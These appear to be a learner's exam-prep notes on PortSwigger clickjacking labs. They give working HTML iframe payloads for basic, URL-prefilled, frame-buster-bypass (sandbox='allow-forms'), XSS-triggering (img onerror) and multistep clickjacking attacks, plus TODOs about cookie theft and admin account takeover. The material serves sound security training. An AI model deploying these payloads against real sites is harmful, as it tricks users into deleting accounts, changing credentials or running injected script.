

Stages 1 + 2 according to [bscp.guide](https://bscp.guide/)


#TODO Need to figure out payloads for each lab for the exam


---
#### 1/2.1. Lab: Basic clickjacking with CSRF token protection ⭕️
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login and go to the exploit server and use the change email feature and notice the `POST` request uses a `csrf` token.
	1. ![Clickjacking-20260212095230540](Clickjacking-20260212095230540.png)
2. Exploit server > paste the payload below (replace your lab id) > Store > View exploit. Modify the `width, height, top, left` numbers to have "Click me" aligned with "Delete account".
	1. **IMPORTANT: Do not click on Click me or Delete account**.
	2. ![Clickjacking-20260212100400937](Clickjacking-20260212100400937.png)
3. Deliver to victim and solve.
```
<style>
   iframe {
       position:relative;
       width:700px;
       height: 600px;
       opacity: 0.1;
       z-index: 2;
    }
 
    div {
       position:absolute;
       top:540px;
       left:60px;
       z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a2b0087031b3d5b8462650b002600a0.web-security-academy.net/my-account"></iframe>
```

How to ID:
- auth blog > every field > change email + delete account > csrf token > remove csrf token: 400 bad request missing parameter csrf 


---

#### 1/2.2. Lab: Clickjacking with form input data prefilled from a URL parameter ⭕️
This lab extends the basic clickjacking example in [Lab: Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected). The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login > use change email > notice a csrf token. 
2. Exploit server > paste the payload below (change YOUR-LAB-ID) > Store > View exploit to ensure that "Click me" hovers over "Update email". 
	1. ![Clickjacking-20260212102630778](Clickjacking-20260212102630778.png)
3. Deliver to victim and solve.
```
<style>
   iframe {
       position:relative;
       width:700px;
       height: 600px;
       opacity: 0.1;
       z-index: 2;
    }
 
    div {
       position:absolute;
       top:540px;
       left:60px;
       z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

#TODO In the exam, we change the admin's email to our email > reset password > gain access to admin's account?

How to ID:
- auth blog > every field > change email > csrf token > remove csrf token: 400 bad request missing parameter csrf 

---

#### 1/2.3. Lab: Clickjacking with a frame buster script ⭕️
This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login > use change email > notice a csrf token. 
2. Exploit server > paste the payload below (change YOUR-LAB-ID) > Store > View exploit to ensure that "Click me" hovers over "Update email". 
	1. **Notice the different between the previous lab is this one requires the `sandbox="allow-forms"` attribute**.
	2. ![Clickjacking-20260212103210830](Clickjacking-20260212103210830.png)
3. Deliver to victim and solve.
```
<style>
   iframe {
       position:relative;
       width:700px;
       height: 600px;
       opacity: 0.1;
       z-index: 2;
    }
 
    div {
       position:absolute;
       top:460px;
       left:60px;
       z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

How to ID:
- auth blog > every field > change email > csrf token > remove csrf token: 400 bad request missing parameter csrf > requires `sandbox="allow-forms"`

---

#### 1/2.4. Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS ⭕️
This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the `print()` function.
1. Notice a Submit Feedback form and a csrf token when you submit one.
2. Use the payload below to run the `print()` function on the victim's machine and solve.

#TODO Need a payload to achieve our adjective like grabbing their cookie.

```
<style>
	iframe {
		position:relative;
	       width:700px;
	       height: 600px;
	       opacity: 0.1;
	       z-index: 2;
	}
	div {
		position:absolute;
		top:520px;
		left:60px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="https://0a2e00bc048d18ee80da03a5007e00ac.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

How to ID:
- unauth blog > every field > submit feedback > csrf token in `POST /feedback/submit`

---

#### 1/2.5. Lab: Multistep clickjacking ⭕️
This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.
You can log in to the account yourself using the following credentials: `wiener:peter`
1. Login and enter the below payload in the exploit server. Replace `YOUR-LAB-ID`. Change the `$` values to ensure `Test me first` lines up with `Delete account` and `Test me next` lines up with `Yes`.
	1. I used width:500px; height: 700px; top:500px; left:50px; top:285px; left:225px;
	2. ![Extra Labs-20260127211843054](Extra%20Labs-20260127211843054.png)
	3. ![244](Extra%20Labs-20260127211250183.png)
	4. ![213](Extra%20Labs-20260127211312897.png)
```
<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; }    .firstClick, .secondClick { position:absolute; top:$top_value1; left:$side_value1; z-index: 1; }    .secondClick { top:$top_value2; left:$side_value2; } </style> <div class="firstClick">Test me first</div> <div class="secondClick">Test me next</div> <iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```
2. To solve, Change `Test me first` and `Test me next` to `Click me first` and `Click me next` > Store > Deliver exploit to victim.
>[!tip] How to Identify this Vulnerability
>1. Relevant action like Update email or Delete account

---